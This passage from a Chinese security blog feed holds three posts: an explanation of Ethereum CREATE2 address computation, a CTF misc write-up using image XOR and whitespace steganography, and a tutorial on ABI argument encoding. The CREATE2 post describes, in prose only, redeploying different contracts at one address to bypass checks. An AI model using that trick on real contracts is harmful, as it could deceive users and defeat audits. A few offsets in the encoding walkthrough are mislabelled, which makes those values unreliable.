        <content type="html"><![CDATA[<p><code>EATE2</code> 是以太坊在 “君士坦丁堡” 这次硬分叉升级中引入的一个新操作码，不同于 <code>CREATE</code>，它使用新的方式来计算合约地址，让生成的合约地址更具有可控性。通过 <code>CREATE2</code> 可以延伸出很多有意思的玩法，在 CTF 中最常见的就是利用这种可控性，在同一个地址先后部署字节码完全不同的合约。</p><h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2><h3 id="create"><a class="markdownIt-Anchor" href="#create"></a> CREATE</h3><p>如果利用外部账户或者使用 <code>CREATE</code> 操作码的合约账户创建一个合约，那么很容易就能确定被创建合约的地址。每个账户都有一个与之关联的 <code>nonce</code>：对外部账户而言，每发送一个交易，<code>nonce</code> 就会随之 <code>+1</code>；对合约账户而言，每创建一个合约，<code>nonce</code> 就会随之 <code>+1</code>。新合约的地址由创建合约交易的发送者账户地址及其 <code>nonce</code> 值计算得到，其具体公式如下：</p><pre class="line-numbers language-none"><code class="language-none">keccak256(rlp.encode(address, nonce))[12:]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="create2"><a class="markdownIt-Anchor" href="#create2"></a> CREATE2</h3><p>不同于原来的 <code>CREATE</code> 操作码，在合约地址的计算方法上，<code>CREATE2</code> 不再依赖于账户的 <code>nonce</code>，而是对以下参数进行哈希计算，得出新的地址：</p><ul><li>合约创建者的地址（<code>address</code>)</li><li>作为参数的混淆值（<code>salt</code>）</li><li>合约创建代码 (<code>init_code</code>)</li></ul><p>具体的计算公式如下：</p><pre class="line-numbers language-none"><code class="language-none">keccak256(0xff ++ address ++ salt ++ keccak256(init_code))[12:]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一个需要注意的重要细节是，计算合约地址所需的最后一个参数并非合约代码，而是其创建代码。该代码是用来创建合约的，合约创建完成后将返回运行时字节码。</p><p>这意味着，如果我们控制了合约的创建代码并使其保持不变，然后控制合约构造函数返回的运行时字节码，那么我们很容易就能做到在同一个地址上，反复部署完全不同的合约。事实上 <code>CREATE2</code> 这种让合约在部署后可以被重新更改的特性存在着潜在的安全问题，也引起了人们对其的<a href="https://ethereum-magicians.org/t/potential-security-implications-of-create2-eip-1014/2614">讨论</a>。</p><p>在 CTF 中，这种特性往往会被用来作为一个技巧，通过在同一个地址上部署不同的合约用来 bypass 不同的校验。</p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>题目</title>
      <link href="/2023/11/20/%E9%A2%98%E7%9B%AE/"/>
      <url>/2023/11/20/%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h3 id="强网拟态2023"><a class="markdownIt-Anchor" href="#强网拟态2023"></a> 强网拟态2023</h3><h4 id="国际象棋与二维码"><a class="markdownIt-Anchor" href="#国际象棋与二维码"></a> 国际象棋与二维码</h4><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921754.png" alt></p><p>查看像素以及方格的个数。然后根据给出的题目为国际象棋棋盘。先生成一个500*500像素，行列为49的国际象棋棋盘</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npsize<span class="token operator">=</span><span class="token number">49</span>grid_size<span class="token operator">=</span><span class="token number">10</span>img<span class="token operator">=</span>Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span><span class="token punctuation">(</span>size<span class="token operator">*</span>grid_size<span class="token punctuation">,</span>size<span class="token operator">*</span>grid_size<span class="token punctuation">)</span><span class="token punctuation">,</span>color<span class="token operator">=</span> <span class="token string">'white'</span><span class="token punctuation">)</span>imag_arr<span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>size<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        imag_arr<span class="token punctuation">[</span>i<span class="token operator">*</span>grid_size<span class="token punctuation">:</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>grid_size<span class="token punctuation">,</span> j<span class="token operator">*</span>grid_size<span class="token punctuation">:</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>grid_size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>         imag_arr<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>grid_size<span class="token punctuation">:</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">*</span>grid_size<span class="token punctuation">,</span> <span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>grid_size<span class="token punctuation">:</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">*</span>grid_size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>final_img <span class="token operator">=</span> Image<span class="token punctuation">.</span>fromarray<span class="token punctuation">(</span>imag_arr<span class="token punctuation">)</span>final_img<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'1.png'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921755.png" alt></p><p>然后与该图片进行异或操作</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> cv2<span class="token comment"># 读取两张图片</span>image1 <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"attach.png"</span><span class="token punctuation">)</span>image2 <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1.png"</span><span class="token punctuation">)</span><span class="token comment"># 调整图片尺寸使其保持一致</span>image1 <span class="token operator">=</span> image1<span class="token punctuation">.</span>resize<span class="token punctuation">(</span>image2<span class="token punctuation">.</span>size<span class="token punctuation">)</span><span class="token comment"># 转换为 numpy 数组</span>array1 <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>image1<span class="token punctuation">)</span>array2 <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>image2<span class="token punctuation">)</span><span class="token comment"># 对两个数组执行异或操作</span>xor_result <span class="token operator">=</span> np<span class="token punctuation">.</span>bitwise_xor<span class="token punctuation">(</span>array1<span class="token punctuation">,</span> array2<span class="token punctuation">)</span><span class="token comment"># 将结果转换为图像并保存</span>result_image <span class="token operator">=</span> Image<span class="token punctuation">.</span>fromarray<span class="token punctuation">(</span>xor_result<span class="token punctuation">)</span>result_image<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"3.png"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921757.png" alt></p><p>扫码得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030921758.png" alt></p><h3 id="帕鲁杯"><a class="markdownIt-Anchor" href="#帕鲁杯"></a> 帕鲁杯</h3><h4 id="ez_misc"><a class="markdownIt-Anchor" href="#ez_misc"></a> ez_misc</h4><p>给了一个加密的rar文件以及一张图片。在图片最后有this is password的空白隐写</p><p>snow解密得</p><p>.\SNOW.EXE -C .\White.txt<br>Carefree and carefree</p><p>修复rar文件，然后解密得到flag</p>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Function Selector and Argument Encoding</title>
      <link href="/2023/11/09/Function-Selector-and-Argument-Encoding/"/>
      <url>/2023/11/09/Function-Selector-and-Argument-Encoding/</url>
      
        <content type="html"><![CDATA[<p>在 Ethereum 生态系统中，ABI (Application Binary Interface，应用二进制接口) 是从区块链外部与合约进行交互以及合约与合约间进行交互的一种标准方式。数据会根据其类型按照这份手册中说明的方法进行编码。</p><h3 id="function-selector"><a class="markdownIt-Anchor" href="#function-selector"></a> Function Selector</h3><h4 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h4><p>某个函数签名的 Keccak (SHA-3) 哈希的前 4 字节，指定了要调用的函数，形如 bytes4(keccak256(‘balanceOf(address)’)) == 0x70a08231 这种形式，0x70a08231 便是 balanceOf(address) 的 Function Selector</p><ul><li>基础原型即是函数名称加上由括号括起来的参数类型列表，参数类型间由一个逗号分隔开，且没有空格</li><li>对于 uint 类型，要转成 uint256 进行计算，比如 ownerOf(uint256) 其 Function Selector = bytes4(keccak256(‘ownerOf(uint256)’)) == 0x6352211e</li><li>函数参数包含结构体，相当于把结构体拆分成单个参数，只不过这些参数用 <code>()</code> 扩起来</li></ul><h3 id="argument-encoding"><a class="markdownIt-Anchor" href="#argument-encoding"></a> Argument Encoding</h3><p>从第5字节开始是被编码的参数。这种编码方式也被用在其他地方，比如，返回值和事件的参数也会被用同样的方式进行编码，而用来指定函数的4个字节则不需要再进行编码。</p><h2 id="类型编码"><a class="markdownIt-Anchor" href="#类型编码"></a> 类型编码</h2><p>以下是基础类型：</p><ul><li><code>uint&lt;M&gt;</code>： <code>M</code> 位的无符号整数， <code>0 &lt; M &lt;= 256</code>、 <code>M % 8 == 0</code>。例如： <code>uint32</code>， <code>uint8</code>， <code>uint256</code>。</li><li><code>int&lt;M&gt;</code>：以 2 的补码作为符号的 <code>M</code> 位整数， <code>0 &lt; M &lt;= 256</code>、 <code>M % 8 == 0</code>。</li><li><code>address</code>：除了字面上的意思和语言类型的区别以外，等价于 <code>uint160</code>。在计算和 函数选择器Function Selector 中，通常使用 <code>address</code>。</li><li><code>uint</code>、 <code>int</code>： <code>uint256</code>、 <code>int256</code> 各自的同义词。在计算和 函数选择器Function Selector 中，通常使用 <code>uint256</code> 和 <code>int256</code>。</li><li><code>bool</code>：等价于 <code>uint8</code>，取值限定为 0 或 1 。在计算和 函数选择器Function Selector 中，通常使用 <code>bool</code>。</li><li><code>fixed&lt;M&gt;x&lt;N&gt;</code>： <code>M</code> 位的有符号的固定小数位的十进制数字 <code>8 &lt;= M &lt;= 256</code>、 <code>M % 8 == 0</code>、且 <code>0 &lt; N &lt;= 80</code>。其值 <code>v</code> 即是 <code>v / (10 ** N)</code>。（也就是说，这种类型是由 M 位的二进制数据所保存的，有 N 位小数的十进制数值。译者注。）</li><li><code>ufixed&lt;M&gt;x&lt;N&gt;</code>：无符号的 <code>fixed&lt;M&gt;x&lt;N&gt;</code>。</li><li><code>fixed</code>、 <code>ufixed</code>： <code>fixed128x18</code>、 <code>ufixed128x18</code> 各自的同义词。在计算和 函数选择器Function Selector 中，通常使用 <code>fixed128x18</code> 和 <code>ufixed128x18</code>。</li><li><code>bytes&lt;M&gt;</code>： <code>M</code> 字节的二进制类型， <code>0 &lt; M &lt;= 32</code>。</li><li><code>function</code>：一个地址（20 字节）之后紧跟一个 函数选择器Function Selector （4 字节）。编码之后等价于 <code>bytes24</code>。</li></ul><p>以下是定长数组类型：</p><ul><li><p><code>&lt;type&gt;[M]</code>：有 <code>M</code> 个元素的定长数组， <code>M &gt;= 0</code>，数组元素为给定类型。</p><p>注解</p><p>尽管此ABI规范可以表示零个元素的定长数组，但编译器不支持它们。</p></li></ul><p>以下是非定长类型：</p><ul><li><code>bytes</code>：动态大小的字节序列。</li><li><code>string</code>：动态大小的 unicode 字符串，通常呈现为 UTF-8 编码。</li><li><code>&lt;type&gt;[]</code>：元素为给定类型的变长数组。</li></ul><p>可以将若干类型放到一对括号中，用逗号分隔开，以此来构成一个 元组tuple：</p><ul><li><code>(T1,T2,...,Tn)</code>：由 <code>T1</code>，…， <code>Tn</code>， <code>n &gt;= 0</code> 构成的 元组tuple。</li></ul><p>用 元组tuple 构成 元组tuple、用 元组tuple 构成数组等等也是可能的。另外也可以构成“零元组（zero-tuples）”，就是 <code>n = 0</code> 的情况。</p><h4 id="solidity-到-abi-类型-映射"><a class="markdownIt-Anchor" href="#solidity-到-abi-类型-映射"></a> Solidity 到 ABI 类型 映射</h4><p>Solidity 支持上面介绍的所有同名称的类型，除元组外。 另一方面，一些 Solidity 类型不被 ABI 支持。下表在左栏显示了不支持 ABI 的 Solidity 类型，以及在右栏显示可以代表它们的 ABI 类型。</p><table><thead><tr><th>Solidity</th><th>ABI</th></tr></thead><tbody><tr><td><a href="https://learnblockchain.cn/docs/solidity/types.html#address">address payable</a></td><td><code>address</code></td></tr><tr><td><a href="https://learnblockchain.cn/docs/solidity/contracts.html#contracts">contract</a></td><td><code>address</code></td></tr><tr><td><a href="https://learnblockchain.cn/docs/solidity/types.html#enums">enum</a></td><td><code>uint8</code></td></tr><tr><td><a href="https://learnblockchain.cn/docs/solidity/types.html#user-defined-value-types">user defined value types</a></td><td>its underlying value type</td></tr><tr><td><a href="https://learnblockchain.cn/docs/solidity/types.html#structs">struct</a></td><td><code>tuple</code></td></tr></tbody></table><h3 id="function-selector-and-argument-encoding"><a class="markdownIt-Anchor" href="#function-selector-and-argument-encoding"></a> Function Selector and Argument Encoding</h3><ul><li>动态类型的数据，比如动态数组，结构体，变长字节，其编码后存储其 <code>offset</code>、<code>length</code>、<code>data</code><ul><li>先把参数顺序存储：如果是定长数据类型，直接存储其 <code>data</code>，如果是变长数据类型，先存储其 <code>offset</code></li><li>顺序遍历变长数据：先存储 <code>offset</code>，对于第一个变长数据，先存储其 <code>offset = 0x20 * number</code> ( <code>number</code> 是函数参数的个数 )；对于下一个变长数据，其 <code>offset = offset_of_prev + 0x20 + 0x20 * number</code> (第一个 <code>0x20</code> 是存储前一个变长数据的长度占用的大小，<code>number</code> 是前一个变长数据的元素个数)</li><li>顺序遍历变长数据：存储完 <code>offset</code> ，接着就是遍历每个变长数据，分别存储其 <code>length</code> 和 <code>data</code></li><li>( <code>ps:</code> 对于结构体这样的类型，存储的时候可把结构体内元素看成是一个新函数的参数，这样的话，对于结构体中的第一个变长数据，其 <code>offset = 0x20 * num</code> ，<code>num</code> 是结构体元素的个数 )</li></ul></li></ul><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token function">test7</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"one"</span><span class="token punctuation">,</span> <span class="token string">"two"</span><span class="token punctuation">,</span> <span class="token string">"three"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity">同理进行由内向外的拆分，首先是<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span>动态数组中的<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span>和<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>两个动态数组<span class="token number">0</span> <span class="token operator">-</span> a                                                                  <span class="token comment">// offset of [1, 2]</span><span class="token number">1</span> <span class="token operator">-</span> b                                                                  <span class="token comment">// offset of [3]</span><span class="token number">2</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000002</span> <span class="token comment">// count for [1, 2]</span><span class="token number">3</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000001</span> <span class="token comment">// encoding of 1</span><span class="token number">4</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000002</span> <span class="token comment">// encoding of 2</span><span class="token number">5</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000001</span> <span class="token comment">// count for [3]</span><span class="token number">6</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000003</span> <span class="token comment">// encoding of 3</span>a指向<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span>的开始，所以a<span class="token operator">=</span><span class="token number">0x20</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">=</span><span class="token number">0x40</span>b指向<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>的开始，所以b<span class="token operator">=</span><span class="token number">0x20</span><span class="token operator">*</span><span class="token number">5</span><span class="token operator">=</span><span class="token number">0xa0</span>然后是<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span>动态数组本身的encoding<span class="token number">0</span> <span class="token operator">-</span> c                                                                  <span class="token comment">// offset of [[1, 2], [3]]</span><span class="token number">1</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000002</span> <span class="token comment">// count for [[1, 2], [3]]</span><span class="token number">2</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000040</span> <span class="token comment">// offset of [1, 2]</span><span class="token number">3</span> <span class="token operator">-</span> <span class="token number">0x00000000000000000000000000000000000000000000000000000000000000a0</span> <span class="token comment">// offset of [3]</span><span class="token number">4</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000002</span> <span class="token comment">// count for [1, 2]</span><span class="token number">5</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000001</span> <span class="token comment">// encoding of 1</span><span class="token number">6</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000002</span> <span class="token comment">// encoding of 2</span><span class="token number">7</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000001</span> <span class="token comment">// count for [3]</span><span class="token number">8</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000003</span> <span class="token comment">// encoding of 3</span>c指向<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span>的开始，所以a<span class="token operator">=</span><span class="token number">0x20</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">=</span><span class="token number">0x40</span>其次是<span class="token punctuation">[</span><span class="token string">"one"</span><span class="token punctuation">,</span> <span class="token string">"two"</span><span class="token punctuation">,</span> <span class="token string">"three"</span><span class="token punctuation">]</span>动态数组中每个<span class="token builtin">string</span>的encoding<span class="token number">0</span> <span class="token operator">-</span> d                                                                  <span class="token comment">// offset for "one"</span><span class="token number">1</span> <span class="token operator">-</span> e                                                                  <span class="token comment">// offset for "two"</span><span class="token number">2</span> <span class="token operator">-</span> f                                                                  <span class="token comment">// offset for "three"</span><span class="token number">3</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000003</span> <span class="token comment">// count for "one"</span><span class="token number">4</span> <span class="token operator">-</span> <span class="token number">0x6f6e650000000000000000000000000000000000000000000000000000000000</span> <span class="token comment">// encoding of "one"</span><span class="token number">5</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000003</span> <span class="token comment">// count for "two"</span><span class="token number">6</span> <span class="token operator">-</span> <span class="token number">0x74776f0000000000000000000000000000000000000000000000000000000000</span> <span class="token comment">// encoding of "two"</span><span class="token number">7</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000005</span> <span class="token comment">// count for "three"</span><span class="token number">8</span> <span class="token operator">-</span> <span class="token number">0x7468726565000000000000000000000000000000000000000000000000000000</span> <span class="token comment">// encoding of "three"</span>d指向“one”的开始，所以d<span class="token operator">=</span><span class="token number">0x20</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">=</span><span class="token number">0x60</span>e指向“two”的开始，所以e<span class="token operator">=</span><span class="token number">0x20</span><span class="token operator">*</span><span class="token number">5</span><span class="token operator">=</span><span class="token number">0xa0</span>f指向“three”的开始，所以f<span class="token operator">=</span><span class="token number">0x20</span><span class="token operator">*</span><span class="token number">7</span><span class="token operator">=</span><span class="token number">0xe0</span>然后是<span class="token punctuation">[</span><span class="token string">"one"</span><span class="token punctuation">,</span> <span class="token string">"two"</span><span class="token punctuation">,</span> <span class="token string">"three"</span><span class="token punctuation">]</span>动态数组本身的encoding<span class="token number">0</span> <span class="token operator">-</span> g                                                                  <span class="token comment">// offset of ["one", "two", "three"]</span><span class="token number">1</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000003</span> <span class="token comment">// count for ["one", "two", "three"]</span><span class="token number">2</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000060</span> <span class="token comment">// offset for "one"</span><span class="token number">3</span> <span class="token operator">-</span> <span class="token number">0x00000000000000000000000000000000000000000000000000000000000000a0</span> <span class="token comment">// offset for "two"</span><span class="token number">4</span> <span class="token operator">-</span> <span class="token number">0x00000000000000000000000000000000000000000000000000000000000000e0</span> <span class="token comment">// offset for "three"</span><span class="token number">5</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000003</span> <span class="token comment">// count for "one"</span><span class="token number">6</span> <span class="token operator">-</span> <span class="token number">0x6f6e650000000000000000000000000000000000000000000000000000000000</span> <span class="token comment">// encoding of "one"</span><span class="token number">7</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000003</span> <span class="token comment">// count for "two"</span><span class="token number">8</span> <span class="token operator">-</span> <span class="token number">0x74776f0000000000000000000000000000000000000000000000000000000000</span> <span class="token comment">// encoding of "two"</span><span class="token number">9</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000005</span> <span class="token comment">// count for "three"</span><span class="token number">10</span><span class="token operator">-</span> <span class="token number">0x7468726565000000000000000000000000000000000000000000000000000000</span> <span class="token comment">// encoding of "three"</span>这里g先不进行计算，因为涉及到函数参数整体的一个encoding上面就已经把最后就是<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span>和<span class="token punctuation">[</span><span class="token string">"one"</span><span class="token punctuation">,</span> <span class="token string">"two"</span><span class="token punctuation">,</span> <span class="token string">"three"</span><span class="token punctuation">]</span>分析完毕，最后就是其作为一个整体进行encoding<span class="token number">0</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000040</span> <span class="token comment">// offset of [[1, 2], [3]]</span><span class="token number">1</span> <span class="token operator">-</span> g                                                                  <span class="token comment">// offset of ["one", "two", "three"]</span><span class="token number">2</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000002</span> <span class="token comment">// count for [[1, 2], [3]]</span><span class="token number">3</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000040</span> <span class="token comment">// offset of [1, 2]</span><span class="token number">4</span> <span class="token operator">-</span> <span class="token number">0x00000000000000000000000000000000000000000000000000000000000000a0</span> <span class="token comment">// offset of [3]</span><span class="token number">5</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000002</span> <span class="token comment">// count for [1, 2]</span><span class="token number">6</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000001</span> <span class="token comment">// encoding of 1</span><span class="token number">7</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000002</span> <span class="token comment">// encoding of 2</span><span class="token number">8</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000001</span> <span class="token comment">// count for [3]</span><span class="token number">9</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000003</span> <span class="token comment">// encoding of 3</span><span class="token number">10</span><span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000003</span> <span class="token comment">// count for ["one", "two", "three"]</span><span class="token number">11</span><span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000060</span> <span class="token comment">// offset for "one"</span><span class="token number">12</span><span class="token operator">-</span> <span class="token number">0x00000000000000000000000000000000000000000000000000000000000000a0</span> <span class="token comment">// offset for "two"</span><span class="token number">13</span><span class="token operator">-</span> <span class="token number">0x00000000000000000000000000000000000000000000000000000000000000e0</span> <span class="token comment">// offset for "three"</span><span class="token number">14</span><span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000003</span> <span class="token comment">// count for "one"</span><span class="token number">15</span><span class="token operator">-</span> <span class="token number">0x6f6e650000000000000000000000000000000000000000000000000000000000</span> <span class="token comment">// encoding of "one"</span><span class="token number">16</span><span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000003</span> <span class="token comment">// count for "two"</span><span class="token number">17</span><span class="token operator">-</span> <span class="token number">0x74776f0000000000000000000000000000000000000000000000000000000000</span> <span class="token comment">// encoding of "two"</span><span class="token number">18</span><span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000005</span> <span class="token comment">// count for "three"</span><span class="token number">19</span><span class="token operator">-</span> <span class="token number">0x7468726565000000000000000000000000000000000000000000000000000000</span> <span class="token comment">// encoding of "three"</span>g指向字符串数组的开始，所以g<span class="token operator">=</span><span class="token number">0x20</span><span class="token operator">*</span><span class="token number">10</span><span class="token operator">=</span><span class="token number">140</span>所以总的selector<span class="token operator">+</span>encoding如下所示<span class="token number">0xcc80bc65</span>                                                             <span class="token comment">// function selector</span><span class="token number">0</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000040</span> <span class="token comment">// offset of [[1, 2], [3]]</span><span class="token number">1</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000140</span> <span class="token comment">// offset of ["one", "two", "three"]</span><span class="token number">2</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000002</span> <span class="token comment">// count for [[1, 2], [3]]</span><span class="token number">3</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000040</span> <span class="token comment">// offset of [1, 2]</span><span class="token number">4</span> <span class="token operator">-</span> <span class="token number">0x00000000000000000000000000000000000000000000000000000000000000a0</span> <span class="token comment">// offset of [3]</span><span class="token number">5</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000002</span> <span class="token comment">// count for [1, 2]</span><span class="token number">6</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000001</span> <span class="token comment">// encoding of 1</span><span class="token number">7</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000002</span> <span class="token comment">// encoding of 2</span><span class="token number">8</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000001</span> <span class="token comment">// count for [3]</span><span class="token number">9</span> <span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000003</span> <span class="token comment">// encoding of 3</span><span class="token number">10</span><span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000003</span> <span class="token comment">// count for ["one", "two", "three"]</span><span class="token number">11</span><span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000060</span> <span class="token 